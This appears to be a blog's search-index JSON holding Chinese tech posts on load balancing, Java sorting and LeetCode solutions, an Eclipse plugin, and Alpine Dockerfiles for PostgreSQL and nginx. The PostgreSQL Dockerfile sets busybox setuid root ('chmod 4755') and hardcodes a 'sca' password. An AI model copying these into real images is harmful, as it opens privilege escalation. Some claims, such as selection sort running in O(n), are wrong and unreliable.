[{"title":"dubbo","path":"/2023/12/28/dubbo/","content":"Dubbo负载均衡策略 RandomLoadBalance:随机负载均衡。随机的选择一个。是Dubbo的默认负载均衡策略。 RoundRobinLoadBalance:轮询负载均衡。轮询选择一个。 LeastActiveLoadBalance:最少活跃调用数，相同活跃数的随机。活跃数指调用前后计数差。使慢的 Provider 收到更少请求，因为越慢的 Provider 的调用前后计数差会越大。 ConsistentHashLoadBalance:一致性哈希负载均衡。相同参数的请求总是落在同一台机器上。","tags":["dubbo"],"categories":["dubbo"]},{"title":"cloud","path":"/2023/12/28/cloud/","content":"Cloud负载均衡策略1.轮询策略轮询策略：RoundRobinRule，按照一定的顺序依次调用服务实例。比如一共有 3 个服务，第一次调用服务 1，第二次调用服务 2，第三次调用服务3，依次类推。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RoundRobinRule #设置负载均衡 2.权重策略权重策略：WeightedResponseTimeRule，根据每个服务提供者的响应时间分配一个权重，响应时间越长，权重越小，被选中的可能性也就越低。 它的实现原理是，刚开始使用轮询策略并开启一个计时器，每一段时间收集一次所有服务提供者的平均响应时间，然后再给每个服务提供者附上一个权重，权重越高被选中的概率也越大。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.WeightedResponseTimeRule 3.随机策略随机策略：RandomRule，从服务提供者的列表中随机选择一个服务实例。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule #设置负载均衡 4.最小连接数策略最小连接数策略：BestAvailableRule，也叫最小并发数策略，它是遍历服务提供者列表，选取连接数最小的⼀个服务实例。如果有相同的最小连接数，那么会调用轮询策略进行选取。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.BestAvailableRule #设置负载均衡 5.重试策略重试策略：RetryRule，按照轮询策略来获取服务，如果获取的服务实例为 null 或已经失效，则在指定的时间之内不断地进行重试来获取服务，如果超过指定时间依然没获取到服务实例则返回 null。 此策略的配置设置如下： 123456ribbon: ConnectTimeout: 2000 # 请求连接的超时时间 ReadTimeout: 5000 # 请求处理的超时时间springcloud-nacos-provider: # nacos 中的服务 id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule #设置负载均衡 6.可用性敏感策略可用敏感性策略：AvailabilityFilteringRule，先过滤掉非健康的服务实例，然后再选择连接数较小的服务实例。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.AvailabilityFilteringRule 7.区域敏感策略区域敏感策略：ZoneAvoidanceRule，根据服务所在区域（zone）的性能和服务的可用性来选择服务实例，在没有区域的环境下，该策略和轮询策略类似。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.ZoneAvoidanceRule","tags":["cloud"],"categories":["cloud"]},{"title":"算法与数据结构","path":"/2023/04/28/algorithm/","content":"排序 冒泡排序冒泡排序的思想是相邻两个数进行大小比较，一步一步的将大的数往后移动，每次循环得到未排序数组里面的最大值。 123456789101112131415public void sort(int[] array) &#123; int length = array.length; for (int i = 0; i &lt; length - 1; i++) &#123; boolean flag = true; for (int j = 0; j &lt; length - 1; j++) &#123; if (array[j] &gt; array[j + 1]) &#123; int temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; flag = false; &#125; &#125; if (flag) return; &#125;&#125; 时间复杂度：升序的时候最好O(n)，降序的时候最坏O(n^2)，平均时间复杂度O(n^2)。 空间复杂度：O(1)。 选择排序选择排序的思想是在剩余的未排序数组里面每次选取最小的放入未排序数组的最前方，重复此步骤，直到排序完成，所以选择排序的时间复杂度很固定。 1234567891011121314public void sort(int[] array) &#123; int length = array.length; for (int i = 0; i &lt; length - 1; i++) &#123; int minIndex = i; for (int j = i + 1; j &lt; length; j++) &#123; if (array[j] &lt; array[minIndex]) &#123; minIndex = j; &#125; &#125; int temp = array[i]; array[i] = array[minIndex]; array[minIndex] = temp; &#125;&#125; 时间复杂度：O(n) 空间复杂度：O(1) 插入排序插入排序的思路和打扑克牌的抓牌时候一样，每次抓牌从手牌右到左比较，遇到比自己小的就插入进去，所以时间复杂度不固定，当是增序的时候每次插入最右边，时间复杂度为O(n)，反之则时间复杂度更高为O(n^2)。 123456789101112public void sort(int[] array) &#123; int length = array.length; for (int i = 1; i &lt; length; i++) &#123; int j = i - 1; int temp = array[i]; while (j &gt;= 0 &amp;&amp; array[j] &gt; temp) &#123; array[j + 1] = array[j]; j--; &#125; array[j + 1] = temp; &#125;&#125; 归并排序归并排序的思想是一种分而治之的思想，将一个大的数组分成2部分，每个部分在继续分成两部分，递归直到不能分的时候，然后将子方法获取到的两个部分就是有序的两个数组 采取双指针法 进行排序。 123456789101112131415161718192021222324252627public static int[] sort(int[] arrays) &#123; int length = arrays.length; if (length &lt; 2) &#123; return arrays; &#125; int middle = length/2; int[] left = Arrays.copyOfRange(arrays, 0, middle); int[] right = Arrays.copyOfRange(arrays, middle, length); return merge(sort(left), sort(right));&#125;public static int[] merge(int[] left, int[] right) &#123; int[] target = new int[left.length + right.length]; int i = 0, j = 0, index = 0; while (i &lt; left.length || j &lt; right.length) &#123; if (i == left.length) &#123; target[index++] = right[j++]; &#125; else if (j == right.length) &#123; target[index++] = left[i++]; &#125; else if (left[i] &lt; right[j]) &#123; target[index++] = left[i++]; &#125; else &#123; target[index++] = right[j++]; &#125; &#125; return target;&#125; 时间复杂度：O(nlogn) 空间复杂度：O(n) 快速排序 从数列中挑出一个元素，称为 “基准”（pivot）; 重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作； 递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序； 12345678910111213141516171819202122232425262728public static int[] sort(int[] arrays, int left, int right) &#123; if (left &lt; right) &#123; int partition = partition(arrays, left, right); sort(arrays, left, partition - 1); sort(arrays, partition + 1, right); &#125; return arrays; &#125; public static int partition(int[] array, int left, int right) &#123; int index = left + 1; for (int i = index; i &lt;= right; i++) &#123; if (array[left] &gt; array[i]) &#123; swap(array, index, i); index++; &#125; &#125; if (array[left] &gt; array[index]) &#123; swap(array, left, index); &#125; return index - 1; &#125; public static void swap(int[] array, int left, int right) &#123; int temp = array[left]; array[left] = array[right]; array[right] = temp; &#125; 123456789101112131415161718192021222324252627282930public static int[] sort1(int[] arrays, int left, int right) &#123; if (left &lt; right) &#123; int partition = partition1(arrays, left, right); sort1(arrays, left, partition - 1); sort1(arrays, partition + 1, right); &#125; return arrays; &#125; public static int partition1(int[] array, int left, int right) &#123; int l = left; int r = right; while (l &lt; r) &#123; while (l &lt; r &amp;&amp; array[l] &lt; array[left]) &#123; l++; &#125; while (l &lt; r &amp;&amp; array[r] &gt;= array[left]) &#123; r--; &#125; swap(array, l, r); &#125; swap(array, l, left); return l; &#125; public static void swap(int[] array, int left, int right) &#123; int temp = array[left]; array[left] = array[right]; array[right] = temp; &#125; 时间复杂度O(nlogn) 空间复杂度O(logn) 链表21.合并两个有序列表将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 示例 1： 12输入：l1 &#x3D; [1,2,4], l2 &#x3D; [1,3,4]输出：[1,1,2,3,4,4] 示例 2： 12输入：l1 &#x3D; [], l2 &#x3D; []输出：[] 示例 3： 12输入：l1 &#x3D; [], l2 &#x3D; [0]输出：[0] 12345678910111213141516171819202122232425262728public ListNode mergeTwoLists(ListNode list1, ListNode list2) &#123; if (list1 == null) return list2; if (list2 == null) return list1; ListNode target = new ListNode(); ListNode current = target; for (; ; ) &#123; // 如果list1链表为空 直接挂list2在后面 if (list1 == null) &#123; current.next = list2; break; &#125; // 如果list2链表为空 直接挂list1在后面 if (list2 == null) &#123; current.next = list1; break; &#125; if (list1.val &lt; list2.val) &#123; current.next = list1; list1 = list1.next; &#125; else &#123; current.next = list2; list2 = list2.next; &#125; current = current.next; &#125; return target.next;&#125; 23.合并k个升序链表给你一个链表数组，每个链表都已经按升序排列。 请你将所有链表合并到一个升序链表中，返回合并后的链表。 示例 1： 12345678910输入：lists &#x3D; [[1,4,5],[1,3,4],[2,6]]输出：[1,1,2,3,4,4,5,6]解释：链表数组如下：[ 1-&gt;4-&gt;5, 1-&gt;3-&gt;4, 2-&gt;6]将它们合并到一个有序链表中得到。1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6 示例 2： 12输入：lists &#x3D; []输出：[] 示例 3： 12输入：lists &#x3D; [[]]输出：[] 1234567891011121314151617181920212223242526272829303132333435363738394041424344public ListNode mergeKLists(ListNode[] lists) &#123; if (lists.length == 0) return null; if (lists.length == 1) return lists[0]; return dep(lists);&#125;public ListNode dep(ListNode[] listNodes) &#123; int length = listNodes.length; if (length == 1) return listNodes[0]; if (length == 2) return mergeTwoLists(listNodes[0], listNodes[1]); int middle = length/2; ListNode left = dep(Arrays.copyOfRange(listNodes, 0, middle)); ListNode right = dep(Arrays.copyOfRange(listNodes, middle, length)); return mergeTwoLists(left, right);&#125;public ListNode mergeTwoLists(ListNode list1, ListNode list2) &#123; if (list1 == null) return list2; if (list2 == null) return list1; ListNode target = new ListNode(); ListNode current = target; for (; ; ) &#123; if (list1 == null) &#123; current.next = list2; break; &#125; if (list2 == null) &#123; current.next = list1; break; &#125; if (list1.val &lt; list2.val) &#123; current.next = list1; current = current.next; list1 = list1.next; &#125; else &#123; current.next = list2; current = current.next; list2 = list2.next; &#125; &#125; return target.next;&#125; LCR 023.相交链表给定两个单链表的头节点 headA 和 headB ，请找出并返回两个单链表相交的起始节点。如果两个链表没有交点，返回 null 。 图示两个链表在节点 c1 开始相交： 题目数据 保证 整个链式结构中不存在环。 注意，函数返回结果后，链表必须 保持其原始结构 。 示例 1： 12345输入：intersectVal &#x3D; 8, listA &#x3D; [4,1,8,4,5], listB &#x3D; [5,0,1,8,4,5], skipA &#x3D; 2, skipB &#x3D; 3输出：Intersected at &#39;8&#39;解释：相交节点的值为 8 （注意，如果两个链表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。 示例 2： 12345输入：intersectVal &#x3D; 2, listA &#x3D; [0,9,1,2,4], listB &#x3D; [3,2,4], skipA &#x3D; 3, skipB &#x3D; 1输出：Intersected at &#39;2&#39;解释：相交节点的值为 2 （注意，如果两个链表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。 示例 3： 12345输入：intersectVal &#x3D; 0, listA &#x3D; [2,6,4], listB &#x3D; [1,5], skipA &#x3D; 3, skipB &#x3D; 2输出：null解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。这两个链表不相交，因此返回 null 。 1234567891011public ListNode getIntersectionNode(ListNode headA, ListNode headB) &#123; ListNode a = headA; ListNode b = headB; while (a != b) &#123; if (a == null) a = headB; else a = a.next; if (b == null) b = headA; else b = b.next; &#125; return a;&#125; 动态规划72.编辑距离题目：给你两个单词 word1 和 word2， 请返回将 word1 转换成 word2 所使用的最少操作数 。 你可以对一个单词进行如下三种操作： 插入一个字符 删除一个字符 替换一个字符 示例 1： 123456输入：word1 &#x3D; &quot;horse&quot;, word2 &#x3D; &quot;ros&quot;输出：3解释：horse -&gt; rorse (将 &#39;h&#39; 替换为 &#39;r&#39;)rorse -&gt; rose (删除 &#39;r&#39;)rose -&gt; ros (删除 &#39;e&#39;) 递推公式： 123456789对于word1的位置i和word2的位置j1、如果word1[i]和word2[j]相等，则不做任何操作。 2、D[i][j-1] 为 A 的前 i 个字符和 B 的前 j - 1 个字符编辑距离的子问题。即对于 B 的第 j 个字符，我们在 A 的末尾添加了一个相同的字符，那么 D[i][j] 最小可以为 D[i][j-1] + 1；3、D[i-1][j] 为 A 的前 i - 1 个字符和 B 的前 j 个字符编辑距离的子问题。即对于 A 的第 i 个字符，我们在 B 的末尾添加了一个相同的字符，那么 D[i][j] 最小可以为 D[i-1][j] + 1；4、D[i-1][j-1] 为 A 前 i - 1 个字符和 B 的前 j - 1 个字符编辑距离的子问题。即对于 B 的第 j 个字符，我们修改 A 的第 i 个字符使它们相同，那么 D[i][j] 最小可以为 D[i-1][j-1] + 1。特别地，如果 A 的第 i 个字符和 B 的第 j 个字符原本就相同，那么我们实际上不需要进行修改操作。在这种情况下，D[i][j] 最小可以为 D[i-1][j-1]。 123456789101112131415161718192021public int minDistance(String word1, String word2) &#123; int length1 = word1.length(); int length2 = word2.length(); int[][] dp = new int[length1 + 1][length2 + 1]; for (int i = 0; i &lt;= length1; i++) &#123; dp[i][0] = i; &#125; for (int i = 0; i &lt;= length2; i++) &#123; dp[0][i] = i; &#125; for (int i = 1; i &lt;= length1; i++) &#123; for (int j = 1; j &lt;= length2; j++) &#123; if (word1.charAt(i - 1) == word2.charAt(j - 1)) &#123; dp[i][j] = dp[i-1][j-1]; &#125; else &#123; dp[i][j] = Math.min(dp[i-1][j] + 1, Math.min(dp[i][j - 1] + 1, dp[i - 1][j - 1] + 1)); &#125; &#125; &#125; return dp[length1][length2];&#125; LCR095.最长公共子序列题目：给定两个字符串 text1 和 text2，返回这两个字符串的最长 公共子序列 的长度。如果不存在 公共子序列 ，返回 0 。 一个字符串的 子序列 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。 例如，&quot;ace&quot; 是 &quot;abcde&quot; 的子序列，但 &quot;aec&quot; 不是 &quot;abcde&quot; 的子序列。 两个字符串的 公共子序列 是这两个字符串所共同拥有的子序列。 示例 1： 123输入：text1 &#x3D; &quot;abcde&quot;, text2 &#x3D; &quot;ace&quot; 输出：3 解释：最长公共子序列是 &quot;ace&quot; ，它的长度为 3 。 123456789101112131415public int longestCommonSubsequence(String text1, String text2) &#123; int length1 = text1.length(); int length2 = text2.length(); int[][] dp = new int[length1 + 1][length2 + 1]; for (int i = 1; i &lt;= length1; i++) &#123; for (int j = 1; j &lt;= length2; j++) &#123; if (text1.charAt(i - 1) == text2.charAt(j - 1)) &#123; dp[i][j] = dp[i - 1][j - 1] + 1; &#125; else &#123; dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]); &#125; &#125; &#125; return dp[length1][length2];&#125; 42.接雨水给定 n 个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。 示例 1： 123输入：height &#x3D; [0,1,0,2,1,0,1,3,2,1,2,1]输出：6解释：上面是由数组 [0,1,0,2,1,0,1,3,2,1,2,1] 表示的高度图，在这种情况下，可以接 6 个单位的雨水（蓝色部分表示雨水）。 示例 2： 12输入：height &#x3D; [4,2,0,3,2,5]输出：9 1234567891011121314151617181920212223242526272829303132// 解法一 动态规划// 使用一个temp数组存放每个位置能接的雨水// 从左到右 每次记录最高的max 如果当前节点（i）比max小 代表能接雨水(max-height[i])，存放在temp[i]里面。// 从右到左，每次记录最高的max 如果当前节点（i）比max小 代表能接雨水(max-height[i])，取和temp[i]相比的最小数值即temp[i] = Math.min(temp[i], max-height[i])。// temp数组的加和即为接雨水的大小 public int trap1(int[] height) &#123; if (height.length &lt; 3) &#123; return 0; &#125; int[] temp = new int[height.length]; int max = height[0]; for (int i = 0; i &lt; height.length; i++) &#123; if (height[i] &lt; max) &#123; temp[i] = max - height[i]; &#125; max = Math.max(height[i], max); &#125; max = height[height.length - 1]; for (int i = height.length - 1; i &gt;= 0; i--) &#123; if (height[i] &lt; max) &#123; temp[i] = Math.min(temp[i], max - height[i]); &#125; else &#123; temp[i] = 0; &#125; max = Math.max(height[i], max); &#125; max = 0; for (int i = 0; i &lt; temp.length; i++) &#123; max += temp[i]; &#125; return max; &#125; 12345678910111213141516171819// 解法二 双指针// 左右两个指针，指针移动的时候记录左右的最大值l_max和r_max，当l_max小于r_max的时候，说明左侧是低高度，水的深度取决于左边，即左指针向右走并计算接水量，反之则从右侧往左。\tpublic int trap(int[] height) &#123; int l = 0, r = height.length - 1; int l_max = height[0], r_max = height[height.length - 1]; int res = 0; while (l &lt; r) &#123; l_max = Math.max(l_max, height[l]); r_max = Math.max(r_max, height[r]); if (l_max &lt; r_max) &#123; res += l_max - height[l]; l++; &#125; else &#123; res += r_max - height[r]; r--; &#125; &#125; return res;\t&#125; 双指针end","tags":["算法"],"categories":["算法"]},{"title":"kafka","path":"/2023/04/28/kafka/","content":"Kafka","tags":["kafka"],"categories":["kafka"]},{"title":"搭建一个简单eclipse插件项目","path":"/2022/06/23/搭建一个简单eclipse插件项目/","content":"引言​ 这里主要记录如何手把手搭建一个eclipse的插件项目。 引入插件​ 由于eclipse插件开发需要plugin插件，所以要先去Help-&gt;Install New Software-&gt;选择对应ecipse版本的https://download.eclipse.org/releases/2022-06/202206151000下载地址-&gt;选择General Purpose Tools下的Eclipse Plug-in Development Environment，然后一路next-&gt;accept-&gt;finish，重启就可以创建一个plugin项目了。 新建项目填入项目名称 点击next，填写vender信息，勾选Generate an activator 点击next，选择创建一个模版，这里选择hello world。 点击next，构建一个handler。 创建完之后我们看下目录结构 文件分析目录里面主要的是plugin.xml这个文件，下面对这个文件进行解析，梳理页面与执行SampleHandler的逻辑。 plugin.xml文件如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;?eclipse version=&quot;3.4&quot;?&gt;&lt;plugin&gt; &lt;extension point=&quot;org.eclipse.ui.commands&quot;&gt; &lt;category id=&quot;demo1.commands.category&quot; name=&quot;Sample Category&quot;&gt; &lt;/category&gt; &lt;!-- 这里定义一个command id为demo1.commands.sampleCommand --&gt; &lt;command categoryId=&quot;demo1.commands.category&quot; name=&quot;Sample Command&quot; id=&quot;demo1.commands.sampleCommand&quot;&gt; &lt;/command&gt; &lt;/extension&gt; &lt;extension point=&quot;org.eclipse.ui.handlers&quot;&gt; &lt;!-- 将上面定义的command 指定handler处理器，也就是SampleHandler这个类 --&gt; &lt;handler class=&quot;demo1.handlers.SampleHandler&quot; commandId=&quot;demo1.commands.sampleCommand&quot;&gt; &lt;/handler&gt; &lt;/extension&gt; &lt;extension point=&quot;org.eclipse.ui.bindings&quot;&gt; &lt;key commandId=&quot;demo1.commands.sampleCommand&quot; schemeId=&quot;org.eclipse.ui.defaultAcceleratorConfiguration&quot; contextId=&quot;org.eclipse.ui.contexts.window&quot; sequence=&quot;M1+6&quot;&gt; &lt;/key&gt; &lt;/extension&gt; &lt;extension point=&quot;org.eclipse.ui.menus&quot;&gt; &lt;menuContribution locationURI=&quot;menu:org.eclipse.ui.main.menu?after=additions&quot;&gt; &lt;!-- 指定一个菜单，菜单显示为Sample Menu --&gt; &lt;menu id=&quot;demo1.menus.sampleMenu&quot; label=&quot;Sample Menu&quot; mnemonic=&quot;M&quot;&gt; &lt;!-- 将前面注册的command绑定到这个菜单里面 --&gt; &lt;command commandId=&quot;demo1.commands.sampleCommand&quot; id=&quot;demo1.menus.sampleCommand&quot; mnemonic=&quot;S&quot;&gt; &lt;/command&gt; &lt;/menu&gt; &lt;/menuContribution&gt; &lt;menuContribution locationURI=&quot;toolbar:org.eclipse.ui.main.toolbar?after=additions&quot;&gt; &lt;toolbar id=&quot;demo1.toolbars.sampleToolbar&quot;&gt; &lt;command id=&quot;demo1.toolbars.sampleCommand&quot; commandId=&quot;demo1.commands.sampleCommand&quot; icon=&quot;icons/sample.png&quot; tooltip=&quot;Say hello world&quot;&gt; &lt;/command&gt; &lt;/toolbar&gt; &lt;/menuContribution&gt; &lt;/extension&gt;&lt;/plugin&gt; SampleHandler.java 文件 1234567891011121314151617181920212223package demo1.handlers;import org.eclipse.core.commands.AbstractHandler;import org.eclipse.core.commands.ExecutionEvent;import org.eclipse.core.commands.ExecutionException;import org.eclipse.ui.IWorkbenchWindow;import org.eclipse.ui.handlers.HandlerUtil;import org.eclipse.jface.dialogs.MessageDialog;public class SampleHandler extends AbstractHandler &#123;\t@Override\tpublic Object execute(ExecutionEvent event) throws ExecutionException &#123; IWorkbenchWindow window = HandlerUtil.getActiveWorkbenchWindowChecked(event); // 推送弹窗，打印Hello, This is a demo plugin!!! MessageDialog.openInformation( window.getShell(), &quot;Demo1&quot;, &quot;Hello, This is a demo plugin!!!&quot;); return null;\t&#125;&#125; 还有一个Activator类，这个是对插件的生命周期进行管理 getDefault() 取得插件类的实例的方法。插件类是单例的，所以这个方法作为一个静态方法提供。 start() 插件开始时的处理。 stop() 插件停止时的处理。 getLog() log输出时取得ILog用的方法。 getImageRegistry() 取得管理插件内图像的ImageRegistry类。 getPerferenceStore() 取得保存插件设定的IPerferenceStore类。 getDialogSettings() 取得保存对话框设定的IDialogSettings类。 getWorkbench() 取得IWorkbench的实例。 执行调试插件点击左上角的绿色启动按钮 可以看到会新打开一个带有插件的eclipse，可以看到在菜单栏已经有变化，就是插件生效了 接下来我们点击菜单栏的Sample Command，可以看到以下输出 到此，一个简单的eclipse插件就开发完毕了。 参考链接： 引入插件：https://blog.csdn.net/feinifi/article/details/103088082 插件开发：https://www.cnblogs.com/liuzhuo 插件开发：https://blog.csdn.net/feinifi/article/details/106773644","tags":["eclipse"],"categories":["eclipse plugins"]},{"title":"dockerfile基于alpine构建postgresql镜像","path":"/2022/06/21/dockerfile基于alpine构建postgresql镜像/","content":"坏境docker：20.10.10 nginx：1.18.0 podtgres：10.21 准备先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。 准备pgsql的源码包(版本直达)，也可以去pgsql官网处自行下载对应的版本。 准备一个初始化脚本，主要用于创建数据库，用户等等。 准备完之后文件里面内容如下 12345678910╰─$ ls -altotal 50152drwxr-xr-x 8 guoying staff 256 Jun 21 11:42 .drwxr-xr-x 7 guoying staff 224 Jun 22 15:06 ..-rw-r--r-- 1 guoying staff 1408 Jun 21 22:45 Dockerfile-rw-r--r-- 1 guoying staff 108622 Jun 21 11:38 data.sql-rw-r--r-- 1 guoying staff 640 Jun 21 16:07 start.sh-rw-r--r-- 1 guoying staff 2897 Jun 21 11:38 index.sql-rw-r--r-- 1 guoying staff 128105 Jun 21 11:38 initdb.sql-rw-r--r--@ 1 guoying staff 25419930 Jun 21 09:29 postgresql-10.21.tar.gz 编写Dockerfile这里直接展示整个dockerfile文件，已经对应的注释 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465# build pgsqlFROM alpine:3.16.0ARG user=postgresARG group=postgresWORKDIR /# 将必要文件移入镜像ADD postgresql-10.21.tar.gz /# 创建组和用户 ps：pgsql不允许非root安装RUN addgroup -S $&#123;group&#125; &amp;&amp; adduser \\ --disabled-password \\ --gecos &quot;&quot; \\ --home &quot;/home/postgres&quot; \\ --ingroup &quot;$&#123;group&#125;&quot; \\ --no-create-home \\ # --uid &quot;$UID&quot; \\ &quot;$&#123;user&#125;&quot; &amp;&amp; \\ # 指定apk的aliyun源 echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/repositories &amp;&amp; \\ apk update &amp;&amp; \\ # 安装所需要的环境 apk add --no-cache --virtual .build-deps \\ gcc \\ g++ \\ make \\ readline-dev \\ zlib-dev &amp;&amp; \\ cd /postgresql-10.21 &amp;&amp; \\ # 编译 指定端口8888 ./configure --prefix=/sca/postgresql --with-pgport=8888 &amp;&amp; \\ make &amp;&amp; make install &amp;&amp; \\ # 删除缓存和不用的文件 rm -rf /postgresql-10.21 &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ apk del .build-deps \\ gcc \\ g++ \\ make &amp;&amp; \\ # 重新安装运行所需要的依赖 apk add readline-dev &amp;&amp; \\ # 创建数据目录，pgsql的data会放在这个目录里面 mkdir /sca/data &amp;&amp; \\ # 赋予权限 chown -R $&#123;user&#125;:$&#123;user&#125; /sca &amp;&amp; \\ chmod 4755 /bin/busybox# 指定postgres用户USER $&#123;user&#125;# 传递初始化sql和脚本到/sca目录下COPY ./initdb.sql /scaCOPY ./data.sql /scaCOPY ./start.sh /sca# 暴露你的端口EXPOSE 8888# 注意这个-w，得要。CMD [ &quot;/sca/postgresql/bin/pg_ctl&quot;, &quot;-D&quot;, &quot;/sca/data&quot;, &quot;-w&quot;, &quot;start&quot; ] start.sh 12345678910111213141516171819202122232425262728293031323334#!/bin/shport=8888data=/sca/databinpath=/sca/postgresql/bin# 判断是否存在posegresql.conf 从而判断是否已经构建完初始化数据库if [ ! -f &quot;$&#123;data&#125;/postgresql.conf&quot; ];then # 调用initdb 构建初始化数据库 echo &quot;initdb begin&quot; $&#123;binpath&#125;/initdb -D $&#123;data&#125; echo 1 &gt; $&#123;data&#125;/.init echo &quot;initdb end&quot; fi# 导入初始化数据if [ -f &quot;$&#123;data&#125;/.init&quot; ];then echo &quot;start data install&quot; $&#123;binpath&#125;/pg_ctl -D $&#123;data&#125; -w start $&#123;binpath&#125;/psql -p$&#123;port&#125; -c &quot;create role sca with superuser login password &#x27;sca&#x27;&quot; -d postgres $&#123;binpath&#125;/createdb -p$&#123;port&#125; --encoding=UTF8 --owner=sca -e sca # $&#123;binpath&#125;/psql -p$&#123;port&#125; -c &quot;create extension pgcrypto;&quot; -d sca $&#123;binpath&#125;/psql -Usca -dsca -p$&#123;port&#125; -a -f /sca/initdb.sql 1&gt;/dev/null $&#123;binpath&#125;/psql -Usca -dsca -p$&#123;port&#125; -a -f /sca/data.sql 1&gt;/dev/null $&#123;binpath&#125;/psql -p$&#123;port&#125; -c &quot;alter user sca with nosuperuser&quot; -d postgres rm -rf /sca/dbinit.sh rm -rf /sca/data.sql rm -rf /sca/initdb.sql rm -rf $&#123;data&#125;/.init $&#123;binpath&#125;/pg_ctl -D $&#123;data&#125; -m fast -w stop echo &quot;end data install&quot;fi# 启动pgsql，这里用pg_ctl会启动不了容器（原因不知，可能和进程有关）exec $&#123;binpath&#125;/postgres -D $&#123;data&#125; 构建镜像docker build -t fire-pgsql:v1.0.0 . 参考创建普通用户（无密码）：https://stackoverflow.com/questions/49955097/how-do-i-add-a-user-when-im-using-alpine-as-a-base-image","tags":["postgresql"],"categories":["dockerfile"]},{"title":"dockerfile基于alpine构建nginx镜像","path":"/2022/06/21/dockerfile基于alpine构建nginx镜像/","content":"坏境docker：20.10.10 nginx：1.18.0 alpine：3.16.0 准备先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。 准备nginx的源码包(版本直达)，也可以去nginx官网处自行下载对应的版本。 准备一个nginx.conf配置文件，里面主要包含了我们对nginx的一些配置，如下其中某些配置需要修改。 1daemon off ; 准备完之后文件里面内容如下 12345678╰─$ ls -altotal 2056drwxr-xr-x 6 guoying staff 192 Jun 22 10:07 .drwxr-xr-x 7 guoying staff 224 Jun 22 15:06 ..-rw-r--r-- 1 guoying staff 1219 Jun 20 23:25 Dockerfiledrwxr-xr-x 7 guoying staff 224 Jun 20 10:44 dist # 前端文件夹-rw-r--r-- 1 guoying staff 1039530 Apr 21 2020 nginx-1.18.0.tar.gz-rw-r--r-- 1 guoying staff 4820 Jun 20 22:44 nginx.conf #里面需要个daemon off; 编写Dockerfile这里直接展示整个dockerfile文件，已经对应的注释 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# build nginxFROM alpine:3.16.0WORKDIR /# 将源码包考入的镜像的根目录下ADD nginx-1.18.0.tar.gz /# 配置aliyun仓库RUN echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/r epositories &amp;&amp; \\ # 更新apk apk update &amp;&amp; \\ # 安装必要依赖 apk add --no-cache --virtual .build-deps \\ gcc \\ libc-dev \\ make \\ openssl-dev \\ pcre-dev \\ zlib-dev \\ linux-headers \\ curl \\ gnupg \\ libxslt-dev \\ gd-dev \\ geoip-dev &amp;&amp; \\ # 开始编译nginx cd /nginx-1.18.0 &amp;&amp; \\ ./configure --prefix=/sca/nginx &amp;&amp; \\ make &amp;&amp; make install &amp;&amp; \\ # 删除不需要的文件以及缓存 rm -rf nginx-1.18.0.tar.gz &amp;&amp; \\ rm -rf nginx-1.18.0 &amp;&amp; \\ rm -rf /sca/nginx/html &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ # 移除apk的依赖 apk del .build-deps \\ gcc \\ pcre-dev \\ libc-dev \\ make \\ openssl-dev \\ zlib-dev \\ linux-headers \\ curl \\ gnupg \\ libxslt-dev \\ gd-dev \\ geoip-dev &amp;&amp; \\ # 重新安装运行时需要的依赖 apk add pcre-dev# cp html file to containerCOPY ./dist /sca/nginx/htmlCOPY ./nginx.conf /sca/nginx/conf/# 暴露80端口EXPOSE 80# add run command CMD [ &quot;/sca/nginx/sbin/nginx&quot; ] 构建镜像docker build -t fire-nginx:v1.0.0 